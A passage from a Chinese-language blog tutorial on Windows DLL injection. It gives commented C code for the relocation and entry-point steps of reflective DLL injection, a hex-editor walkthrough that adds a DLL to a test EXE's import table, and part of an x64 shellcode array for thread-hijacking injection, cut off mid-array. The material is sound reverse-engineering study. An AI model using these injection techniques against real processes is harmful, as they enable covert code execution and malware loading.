<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 为目标DLL文件申请的内存空间的基址 - 目标DLL文件的ImageBase
</span><span class=c1>// 为什么是相减？根据公式(实际Image地址 + 需要重定位地址的值 - DLL默认ImageBase)，在这里需要重定位地址的值在后面才会得到，因此在这里先执行相减操作
</span><span class=c1>// 这也是加载器的重定位时需要做的，加载器遍历重定位表,找到要修正的数据
</span><span class=c1></span><span class=n>uiLibraryAddress</span> <span class=o>=</span> <span class=n>uiBaseAddress</span> <span class=o>-</span> <span class=p>((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiHeaderValue</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>ImageBase</span><span class=p>;</span>
<span class=c1>// 获取重定位表地址
</span><span class=c1></span><span class=n>uiValueB</span> <span class=o>=</span> <span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>)</span> <span class=o>&amp;</span> <span class=p>((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiHeaderValue</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>DataDirectory</span><span class=p>[</span><span class=n>IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class=p>];</span>
<span class=c1>// 如果重定位表存在，Size就不为0
</span><span class=c1></span><span class=k>if</span> <span class=p>(((</span><span class=n>PIMAGE_DATA_DIRECTORY</span><span class=p>)</span><span class=n>uiValueB</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>Size</span><span class=p>)</span>
<span class=p>{</span>
	<span class=c1>// 获取重定位块表起始地址
</span><span class=c1></span>	<span class=n>uiValueC</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_DATA_DIRECTORY</span><span class=p>)</span><span class=n>uiValueB</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>);</span>
	<span class=c1>// 遍历重定位块
</span><span class=c1></span>	<span class=k>while</span> <span class=p>(((</span><span class=n>PIMAGE_BASE_RELOCATION</span><span class=p>)</span><span class=n>uiValueC</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>SizeOfBlock</span><span class=p>)</span>
	<span class=p>{</span>
		<span class=c1>// 获取该重定位块的虚拟地址
</span><span class=c1></span>		<span class=n>uiValueA</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_BASE_RELOCATION</span><span class=p>)</span><span class=n>uiValueC</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>);</span>
		<span class=c1>// SizeOfBlock 是该重定位块的大小，包括IMAGE_BASE_RELOCATION结构体 + 记录偏移类型与偏移地址的TypeOffSet数组
</span><span class=c1></span>		<span class=c1>// TypeOffset 为2字节，高4位代表重定位类型，低12位代表偏移地址，偏移地址+VirtualAddress就为重定位的地址
</span><span class=c1></span>		<span class=c1>// [SizeOfBlock - 结构体的大小sizeof(IMAGE_BASE_RELOCATION)] / 两字节 = TypeOffset数组元素的数量
</span><span class=c1></span>		<span class=n>uiValueB</span> <span class=o>=</span> <span class=p>(((</span><span class=n>PIMAGE_BASE_RELOCATION</span><span class=p>)</span><span class=n>uiValueC</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>SizeOfBlock</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>IMAGE_BASE_RELOCATION</span><span class=p>))</span> <span class=o>/</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>IMAGE_RELOC</span><span class=p>);</span>
		<span class=c1>// 获取当前重定位块的TypeOffset数组的第一个元素的地址
</span><span class=c1></span>		<span class=n>uiValueD</span> <span class=o>=</span> <span class=n>uiValueC</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>IMAGE_BASE_RELOCATION</span><span class=p>);</span>
		<span class=c1>// 遍历当前重定位块的所有TypeOffset数组元素
</span><span class=c1></span>		<span class=k>while</span> <span class=p>(</span><span class=n>uiValueB</span><span class=o>--</span><span class=p>)</span>
		<span class=p>{</span>
			<span class=c1>// 执行重定位，可以跳过 IMAGE_REL_BASED_ABSOLUTE(重定位类型,无特别意义，只是为了让每个段4字节对齐，就是填充作用，里面并没有数据)
</span><span class=c1></span>			<span class=c1>// 不使用switch表达式来避免编译器构建一个位置不是那么独立的跳转表
</span><span class=c1></span>            <span class=c1>// switch汇编后会在.rdata节区处生成跳转表以供switch用来当作跳转参考
</span><span class=c1></span>			<span class=c1>//IMAGE_REL_BASED_DIR64(重定位类型,对指向的整个地址进行修正
</span><span class=c1></span>			<span class=c1>//(实际Image地址 - DLL默认ImageBase) + 重定位数据地址(RVA)
</span><span class=c1></span>			<span class=c1>// 这里uiLibraryAddress 为(实际Image地址 - DLL默认ImageBase),
</span><span class=c1></span>			<span class=c1>// 重定位数据地址(RVA) = uiValueA + uiValueD-&gt;offset = VirtualAddress + offset
</span><span class=c1></span>			<span class=k>if</span> <span class=p>(((</span><span class=n>PIMAGE_RELOC</span><span class=p>)</span><span class=n>uiValueD</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>type</span> <span class=o>==</span> <span class=n>IMAGE_REL_BASED_DIR64</span><span class=p>)</span>
				<span class=c1>//就是 IMAGE_BASE_RELOCATION + offset = 重定位后的RVA地址，然后该RVA地址的值 + uiLibraryAddress = 重定位后在内存的VA
</span><span class=c1></span>				<span class=o>*</span><span class=p>(</span><span class=n>ULONG_PTR</span><span class=o>*</span><span class=p>)(</span><span class=n>uiValueA</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_RELOC</span><span class=p>)</span><span class=n>uiValueD</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>offset</span><span class=p>)</span> <span class=o>+=</span> <span class=n>uiLibraryAddress</span><span class=p>;</span>
			<span class=c1>// 同上，这两个重定位类型都是对指向的整个地址修正，一个x64一个x86
</span><span class=c1></span>			<span class=c1>// 也可以注意到不同的重定位类型只是影响地址取多少位
</span><span class=c1></span>			<span class=k>else</span> <span class=nf>if</span> <span class=p>(((</span><span class=n>PIMAGE_RELOC</span><span class=p>)</span><span class=n>uiValueD</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>type</span> <span class=o>==</span> <span class=n>IMAGE_REL_BASED_HIGHLOW</span><span class=p>)</span>
				<span class=o>*</span><span class=p>(</span><span class=n>DWORD</span><span class=o>*</span><span class=p>)(</span><span class=n>uiValueA</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_RELOC</span><span class=p>)</span><span class=n>uiValueD</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>offset</span><span class=p>)</span> <span class=o>+=</span> <span class=p>(</span><span class=n>DWORD</span><span class=p>)</span><span class=n>uiLibraryAddress</span><span class=p>;</span>
			<span class=k>else</span> <span class=nf>if</span> <span class=p>(((</span><span class=n>PIMAGE_RELOC</span><span class=p>)</span><span class=n>uiValueD</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>type</span> <span class=o>==</span> <span class=n>IMAGE_REL_BASED_HIGH</span><span class=p>)</span>
				<span class=o>*</span><span class=p>(</span><span class=n>WORD</span><span class=o>*</span><span class=p>)(</span><span class=n>uiValueA</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_RELOC</span><span class=p>)</span><span class=n>uiValueD</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>offset</span><span class=p>)</span> <span class=o>+=</span> <span class=n>HIWORD</span><span class=p>(</span><span class=n>uiLibraryAddress</span><span class=p>);</span>
			<span class=k>else</span> <span class=nf>if</span> <span class=p>(((</span><span class=n>PIMAGE_RELOC</span><span class=p>)</span><span class=n>uiValueD</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>type</span> <span class=o>==</span> <span class=n>IMAGE_REL_BASED_LOW</span><span class=p>)</span>
				<span class=o>*</span><span class=p>(</span><span class=n>WORD</span><span class=o>*</span><span class=p>)(</span><span class=n>uiValueA</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_RELOC</span><span class=p>)</span><span class=n>uiValueD</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>offset</span><span class=p>)</span> <span class=o>+=</span> <span class=n>LOWORD</span><span class=p>(</span><span class=n>uiLibraryAddress</span><span class=p>);</span>
			<span class=c1>// 获取该重定位块的下一个TypeOffset数组元素
</span><span class=c1></span>			<span class=n>uiValueD</span> <span class=o>+=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>IMAGE_RELOC</span><span class=p>);</span>
		<span class=p>}</span>
		<span class=c1>// 获取下一个重定位块
</span><span class=c1></span>		<span class=n>uiValueC</span> <span class=o>=</span> <span class=n>uiValueC</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_BASE_RELOCATION</span><span class=p>)</span><span class=n>uiValueC</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>SizeOfBlock</span><span class=p>;</span>
	<span class=p>}</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>步骤7 : 调用Dll的入口函数DllMain</p>
<p>核心代码:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// uiValueA 为 DLL文件PE头记录的入口点地址
</span><span class=c1></span><span class=n>uiValueA</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiHeaderValue</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>AddressOfEntryPoint</span><span class=p>);</span>
<span class=c1>// 必须刷新指令缓存来避免使用被我们在重定位过程更新的旧代码
</span><span class=c1>// 就是程序的指令在编译后就不会改变，当我们向程序里面添加新的DLL后，程序就会增加新的指令
</span><span class=c1>// 当程序的指令被更改后通过该函数可以刷新CPU，让CPU可以读取并执行新的指令
</span><span class=c1></span><span class=n>pNtFlushInstructionCache</span><span class=p>((</span><span class=n>HANDLE</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
<span class=c1>// 如果通过LoadRemoteLibraryR函数注入DLL，可以调用DllMain并通过DllMain的lpReserved参数传递我们的参数
</span><span class=c1></span><span class=p>((</span><span class=n>DLLMAIN</span><span class=p>)</span><span class=n>uiValueA</span><span class=p>)((</span><span class=n>HINSTANCE</span><span class=p>)</span><span class=n>uiBaseAddress</span><span class=p>,</span> <span class=n>DLL_PROCESS_ATTACH</span><span class=p>,</span> <span class=n>lpParameter</span><span class=p>);</span>
<span class=c1>// 调用反射加载器返回新的DLL入口地址以便能调用DllMain()
</span><span class=c1></span><span class=k>return</span> <span class=n>uiValueA</span><span class=p>;</span>
</code></pre></td></tr></table>
</div>
</div><p>以上就是对ReflectiveLoader函数的解析，同时反射式DLL注入的技术分析也完成了。</p>
<p>这个技术通过手动将DLL从文件结构加载至内存称为Image结构，能学到的东西非常多。最重要的就是了解了一个PE文件加载至内存的步骤，在这过程中获得与操作PE结构里的各个数据的方法也就相当于做了一个PE查看器，只是缺少了一个printf将这些数据打印出来。同时，之前在学习PE文件结构的时候，我并没有学习重定位表，在学习该技术的时候，我也顺便把重定位表的结构，文件如何重定位给学习了。</p>
<p>该方法对于Windows逆向初学者来说非常值得学习。</p>
<h4 id=0x6-静态dll注入>0x6 静态DLL注入</h4>
<p>除了上述在进程运行途中注入DLL的方法，还可通过修改PE文件的导入表数据，让PE文件在运行时就自动把DLL加载。</p>
<p>原因是，在进程创建之初ntdll.dll就已经被映射到新进程中了，并且新进程创建后不会立马跳转到EXE文件的入口点执行代码。当我们用Windbg调试一个EXE程序时，我们会发现调试器首先暂停到了ntdll.dll内，因此我们可以判断，进程会首先进入ntdll.dll中。经过资料查找，当一个进程被创建后，它会首先执行ntdll.dll中的LdrInitializeThunk函数，该函数会调用LdrpInitializeProcess对进程一些必要内容进行初始化，然后LdrpInitializeProcess会调用LdrpWalkImportDescriptor对导入表进行处理，也即加载导入表中的DLL，并且更改进程IAT。</p>
<p>因此我们对PE文件的导入表添加我们的目的DLL，即可在进程创建后自动加载。</p>
<p>流程图:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e9%9d%99%e6%80%81%e6%b3%a8%e5%85%a5DLL.png data-srcset="/dllinjection/%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5DLL.png, %e9%9d%99%e6%80%81%e6%b3%a8%e5%85%a5DLL.png 1.5x, /dllinjection/%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5DLL.png 2x" data-sizes=auto alt=/dllinjection/%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5DLL.png title=静态注入DLL></p>
<p>以我自己写的测试用EXE为例，该EXE运行起来后程序会先停止等待用户按下任意键，然后弹出一个含有"test"字符串的窗口。TestDll.dll为了能保证顺利注入，需要在形式上保持完整性，也就是需要有导出函数，因此添加了如下导出函数。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kr>__declspec</span><span class=p>(</span><span class=n>dllexport</span><span class=p>)</span> <span class=kt>void</span> <span class=n>dummy</span><span class=p>()</span>
<span class=p>{</span>
    <span class=k>return</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>TestDll.dll的入口函数会弹出一个含有"Injection Success"字符串的窗口，说明注入成功。</p>
<p>我们首先检查其IDT所在空间是否还有空闲区域给我们添加目标DLL的IID结构体。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e6%a3%80%e6%9f%a5IDT%e6%98%af%e5%90%a6%e8%bf%98%e6%9c%89%e7%a9%ba%e9%97%b4.png data-srcset="/dllinjection/%E6%A3%80%E6%9F%A5IDT%E6%98%AF%E5%90%A6%E8%BF%98%E6%9C%89%E7%A9%BA%E9%97%B4.png, %e6%a3%80%e6%9f%a5IDT%e6%98%af%e5%90%a6%e8%bf%98%e6%9c%89%e7%a9%ba%e9%97%b4.png 1.5x, /dllinjection/%E6%A3%80%E6%9F%A5IDT%E6%98%AF%E5%90%A6%E8%BF%98%E6%9C%89%E7%A9%BA%E9%97%B4.png 2x" data-sizes=auto alt=/dllinjection/%E6%A3%80%E6%9F%A5IDT%E6%98%AF%E5%90%A6%E8%BF%98%E6%9C%89%E7%A9%BA%E9%97%B4.png title=检查IDT是否还有空间></p>
<p>可以看到，全0的IID结构体后紧接着就是其余的数据了，因此该IDT所在空间已经没有空间让我们添加目标DLL的IID结构体了，因此我们需要将IDT转移到足够大的空余区域。</p>
<p>经过查看，发现在地址2240h以后有足够的区域，该区域在.data的virtualoffset + virtualsize里，因此能被加载至内存中。我们将IDT转移至该区域。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=data.png data-srcset="/dllinjection/data.png, data.png 1.5x, /dllinjection/data.png 2x" data-sizes=auto alt=/dllinjection/data.png title=data></p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e8%bd%ac%e7%a7%bb%e5%90%8eIDT.png data-srcset="/dllinjection/%E8%BD%AC%E7%A7%BB%E5%90%8EIDT.png, %e8%bd%ac%e7%a7%bb%e5%90%8eIDT.png 1.5x, /dllinjection/%E8%BD%AC%E7%A7%BB%E5%90%8EIDT.png 2x" data-sizes=auto alt=/dllinjection/%E8%BD%AC%E7%A7%BB%E5%90%8EIDT.png title=转移后IDT></p>
<p>因为我们更改了IDT的位置，因此在DATA_DIRTECTORY[1]中的virtualAddress和size也需要更改。2240h转为RVA为3040h，size需要加14。更改后如下图：</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e6%9b%b4%e6%94%b9%e5%90%8e%e7%9a%84IMPORT.png data-srcset="/dllinjection/%E6%9B%B4%E6%94%B9%E5%90%8E%E7%9A%84IMPORT.png, %e6%9b%b4%e6%94%b9%e5%90%8e%e7%9a%84IMPORT.png 1.5x, /dllinjection/%E6%9B%B4%E6%94%B9%E5%90%8E%E7%9A%84IMPORT.png 2x" data-sizes=auto alt=/dllinjection/%E6%9B%B4%E6%94%B9%E5%90%8E%E7%9A%84IMPORT.png title=更改后的IMPORT></p>
<p>接着检查该EXE是否有绑定导入表，用编辑器查看可以发现该EXE并不存在绑定导入表，即在DATA_DIRECTORY[11]的数据全为0，如下图:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e7%bb%91%e5%ae%9a%e5%af%bc%e5%85%a5%e8%a1%a8.png data-srcset="/dllinjection/%E7%BB%91%E5%AE%9A%E5%AF%BC%E5%85%A5%E8%A1%A8.png, %e7%bb%91%e5%ae%9a%e5%af%bc%e5%85%a5%e8%a1%a8.png 1.5x, /dllinjection/%E7%BB%91%E5%AE%9A%E5%AF%BC%E5%85%A5%E8%A1%A8.png 2x" data-sizes=auto alt=/dllinjection/%E7%BB%91%E5%AE%9A%E5%AF%BC%E5%85%A5%E8%A1%A8.png title=绑定导入表></p>
<p>现在就需要创建目标DLL的IID结构体了。我们选择文件偏移为2320h，2330h，2340h(RVA:3120h，3130h，3140h)分别为INT、Name、IAT的地址，然后如下图填入数据。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e6%b7%bb%e5%8a%a0%e4%ba%86IID.jpg data-srcset="/dllinjection/%E6%B7%BB%E5%8A%A0%E4%BA%86IID.jpg, %e6%b7%bb%e5%8a%a0%e4%ba%86IID.jpg 1.5x, /dllinjection/%E6%B7%BB%E5%8A%A0%E4%BA%86IID.jpg 2x" data-sizes=auto alt=/dllinjection/%E6%B7%BB%E5%8A%A0%E4%BA%86IID.jpg title=添加了IID></p>
<p>最后再更改IAT的属性值，赋予其可写权限，因为我们的IAT所在内存节区属于.data节区，所以我们要给.dara节区赋予可写权限，但是检查发现该节区已经拥有了可写属性。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=data%e8%8a%82%e5%8c%ba%e5%b1%9e%e6%80%a7.png data-srcset="/dllinjection/data%E8%8A%82%E5%8C%BA%E5%B1%9E%E6%80%A7.png, data%e8%8a%82%e5%8c%ba%e5%b1%9e%e6%80%a7.png 1.5x, /dllinjection/data%E8%8A%82%E5%8C%BA%E5%B1%9E%E6%80%A7.png 2x" data-sizes=auto alt=/dllinjection/data%E8%8A%82%E5%8C%BA%E5%B1%9E%E6%80%A7.png title=data节区属性></p>
<p>最后保存，运行结果如下：</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e6%b5%8b%e8%af%95%e7%bb%93%e6%9e%9c.png data-srcset="/dllinjection/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C.png, %e6%b5%8b%e8%af%95%e7%bb%93%e6%9e%9c.png 1.5x, /dllinjection/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C.png 2x" data-sizes=auto alt=/dllinjection/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C.png title=测试结果></p>
<p>这里有个问题，也是在我做的时候碰到的问题。就是上述我给DLL添加的导出函数名称为dummy，但是我在_IMAGE_IMPORT_BY_NAME结构体的Name成员写入的不是dummy而是?dummy@@YAXXZ。如果写dummy的话就会出现如下图所示的警告</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e6%8a%a5%e9%94%99.png data-srcset="/dllinjection/%E6%8A%A5%E9%94%99.png, %e6%8a%a5%e9%94%99.png 1.5x, /dllinjection/%E6%8A%A5%E9%94%99.png 2x" data-sizes=auto alt=/dllinjection/%E6%8A%A5%E9%94%99.png title=报错></p>
<p>原因是在C++编译器编译的时候会根据函数定义的一些信息，例如函数类型和函数调用约定，给函数名称添加修饰字符。我们可以通过IDA查看dummy函数被编译后添加了那些字符串。</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=dummy%e4%bf%ae%e9%a5%b0%e5%ad%97%e7%ac%a6.png data-srcset="/dllinjection/dummy%E4%BF%AE%E9%A5%B0%E5%AD%97%E7%AC%A6.png, dummy%e4%bf%ae%e9%a5%b0%e5%ad%97%e7%ac%a6.png 1.5x, /dllinjection/dummy%E4%BF%AE%E9%A5%B0%E5%AD%97%E7%AC%A6.png 2x" data-sizes=auto alt=/dllinjection/dummy%E4%BF%AE%E9%A5%B0%E5%AD%97%E7%AC%A6.png title=dummy修饰字符></p>
<p>一般情况下，链接程序需要通过修饰字符来定位函数的正确位置，但一般情况下并不需要程序员知道函数的名字修饰，链接程序或其它工具会自动区分。在汇编程序调用C/C++函数就应该特别小心函数名称的修饰字符，因为函数名+修饰字符才能算是一个完整的函数，函数的任何相关属性改变都会导致名字修饰不再有效。这方面的知识也并不在该博客讨论的范围内，因此浅尝即止，但这个错误也让我学到了一个小知识，以及在修改导入表和导出表时需要注意这些细节。</p>
<h4 id=0x7-线程劫持注入实现失败并且未能找出问题所在>0x7 线程劫持注入(实现失败，并且未能找出问题所在)</h4>
<p>这个注入方法实现失败，当我注入后，目标进程就会闪退，我尝试通过x64dbg进行调试，但是在这个情况下注入却能成功，目标DLL代码能执行，进程也不会闪退。但是离开了调试器，DLL代码就不会执行，并且进程闪退。我没能找出问题所在，但是它的思路的还是很值得学习，因此还是把这个方法的分析加进来。失败的代码也还存放在项目代码里。如果有大佬能指出问题所在，王某万分感谢。</p>
<p>该方法的实现就是先把Shellcode写好，shellcode执行的是调用LoadLibrary函数，参数为目标DLL地址，然后通过将线程挂起，将线程Context的Rip改为Shellcode的起始地址，然后就能执行Shellcode并加载目标DLL了。</p>
<p>流程图:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e7%ba%bf%e7%a8%8b%e5%8a%ab%e6%8c%81%e6%b5%81%e7%a8%8b%e5%9b%be.png data-srcset="/dllinjection/%E7%BA%BF%E7%A8%8B%E5%8A%AB%E6%8C%81%E6%B5%81%E7%A8%8B%E5%9B%BE.png, %e7%ba%bf%e7%a8%8b%e5%8a%ab%e6%8c%81%e6%b5%81%e7%a8%8b%e5%9b%be.png 1.5x, /dllinjection/%E7%BA%BF%E7%A8%8B%E5%8A%AB%E6%8C%81%E6%B5%81%E7%A8%8B%E5%9B%BE.png 2x" data-sizes=auto alt=/dllinjection/%E7%BA%BF%E7%A8%8B%E5%8A%AB%E6%8C%81%E6%B5%81%E7%A8%8B%E5%9B%BE.png title=线程劫持流程图></p>
<p>Shellcode1:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>ShellCode</span> <span class=p>[]</span> <span class=o>=</span>
<span class=p>{</span> 
	<span class=mh>0x50</span><span class=p>,</span> <span class=c1>// push rax (save rax)
</span><span class=c1></span>	<span class=mh>0x48</span><span class=p>,</span> <span class=mh>0xB8</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=c1>// mov rax, 0CCCCCCCCCCCCCCCCh (place holder for return address)
</span><span class=c1></span>	<span class=mh>0x9c</span><span class=p>,</span>                                                                   <span class=c1>// pushfq
</span><span class=c1></span>	<span class=mh>0x51</span><span class=p>,</span>                                                                   <span class=c1>// push rcx
</span><span class=c1></span>	<span class=mh>0x52</span><span class=p>,</span>                                                                   <span class=c1>// push rdx
</span><span class=c1></span>	<span class=mh>0x53</span><span class=p>,</span>                                                                   <span class=c1>// push rbx
</span><span class=c1></span>	<span class=mh>0x55</span><span class=p>,</span>                                                                   <span class=c1>// push rbp
</span><span class=c1></span>	<span class=mh>0x56</span><span class=p>,</span>                                                                   <span class=c1>// push rsi
</span><span class=c1></span>	<span class=mh>0x57</span><span class=p>,</span>                                                                   <span class=c1>// push rdi
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span>                                                             <span class=c1>// push r8
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span>                                                             <span class=c1>// push r9
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span>                                                             <span class=c1>// push r10
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span>                                                             <span class=c1>// push r11
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span>                                                             <span class=c1>// push r12
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span>                                                             <span class=c1>// push r13
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x56</span><span class=p>,</span>                                                             <span class=c1>// push r14
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span>                                                             <span class=c1>// push r15
</span><span class=c1></span>	<span class=mh>0x68</span><span class=p>,</span> <span class=mh>0xef</span><span class=p>,</span><span class=mh>0xbe</span><span class=p>,</span><span class=mh>0xad</span><span class=p>,</span><span class=mh>0xde</span><span class=p>,</span>
	<span class=mh>0x48</span><span class=p>,</span> <span class=mh>0xB9</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=c1>// mov rcx, 0CCCCCCCCCCCCCCCCh (place holder for DLL path name)
</span><span class=c1></span>	<span class=mh>0x48</span><span class=p>,</span> <span class=mh>0xB8</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=mh>0xCC</span><span class=p>,</span> <span class=c1>// mov rax, 0CCCCCCCCCCCCCCCCh (place holder for LoadLibrary)
</span><span class=c1></span>	<span class=mh>0xFF</span><span class=p>,</span> <span class=mh>0xD0</span><span class=p>,</span>                <span class=c1>// call rax (call LoadLibrary)
</span><span class=c1></span>	<span class=mh>0x58</span><span class=p>,</span> <span class=c1>// pop dummy
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span>                                                             <span class=c1>// pop r15
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span>                                                             <span class=c1>// pop r14
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span>                                                             <span class=c1>// pop r13
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span>                                                             <span class=c1>// pop r12
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x5B</span><span class=p>,</span>                                                             <span class=c1>// pop r11
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span>                                                             <span class=c1>// pop r10
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span>                                                             <span class=c1>// pop r9
</span><span class=c1></span>	<span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span>                                                             <span class=c1>// pop r8
